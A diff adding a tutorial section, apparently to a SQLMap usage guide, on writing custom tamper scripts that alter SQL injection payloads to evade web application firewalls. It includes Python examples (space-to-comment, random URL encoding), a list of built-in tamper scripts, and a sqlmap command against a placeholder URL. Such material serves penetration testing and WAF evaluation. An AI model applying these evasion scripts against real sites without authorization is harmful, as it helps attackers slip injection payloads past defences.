@@ -129,7 +129,136 @@
 - **Some Tamper Scripts I use**
   ```tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords```
   
-### 6. 
+### 6. Creating Your Own Tamper Script
+Creating your own tamper script for SQLMap involves writing a Python script that modifies the payloads used by SQLMap to evade web application firewalls (WAFs) or other filtering mechanisms. Here is a step-by-step guide to create a custom tamper script.
+
+### Step 1: Understand the Basics of a Tamper Script
+
+A tamper script modifies the payload sent to the server. The script should contain a function called `tamper` that takes a payload string as an argument and returns the modified payload string.
+
+### Step 2: Structure of a Tamper Script
+
+Here is the basic structure of a tamper script:
+
+```python
+#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    # Modify the payload here
+    modified_payload = payload
+    return modified_payload
+```
+
+- `__priority__`: Defines the order in which tamper scripts are applied.
+- `dependencies()`: Checks for any required dependencies.
+- `tamper(payload)`: The main function that modifies the payload.
+
+### Step 3: Implement a Simple Tamper Script
+
+Let's create a simple tamper script that replaces spaces with comments to evade basic filters.
+
+#### Example: Space-to-Comment Tamper Script
+
+```python
+#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    """
+    Replaces space character (' ') with a random inline comment ('/**/')
+    """
+    if payload:
+        payload = payload.replace(" ", "/**/")
+    return payload
+```
+
+### Step 4: More Advanced Example
+
+Now, let's create a more advanced tamper script that randomly URL-encodes characters in the payload.
+
+#### Example: Random URL Encoding Tamper Script
+
+```python
+#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    """
+    Randomly URL encodes characters in the payload
+    """
+    if payload:
+        encoded_payload = ""
+        for char in payload:
+            if random.randint(0, 1):
+                encoded_payload += "%%%02x" % ord(char)
+            else:
+                encoded_payload += char
+        return encoded_payload
+    return payload
+```
+
+### Step 5: Save and Use the Tamper Script
+
+1. **Save the Script**: Save your tamper script in the `tamper` directory of your SQLMap installation. For example, save it as `random_urlencode.py`.
+
+2. **Use the Script**: Use the `--tamper` option in SQLMap to apply your custom tamper script.
+
+```sh
+sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=random_urlencode
+```
+
+### Step 6: Testing and Debugging
+
+- **Test**: Ensure the script works as intended by running SQLMap with different payloads.
+- **Debug**: Print debug information if necessary. You can add print statements within the `tamper` function to debug your script.
+
+#### Debugging Example
+
+```python
+#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    """
+    Randomly URL encodes characters in the payload
+    """
+    if payload:
+        encoded_payload = ""
+        for char in payload:
+            if random.randint(0, 1):
+                encoded_payload += "%%%02x" % ord(char)
+            else:
+                encoded_payload += char
+        print(f"Original: {payload}")
+        print(f"Modified: {encoded_payload}")
+        return encoded_payload
+    return payload
+```
 
 ### 7. Some More Techniques
 
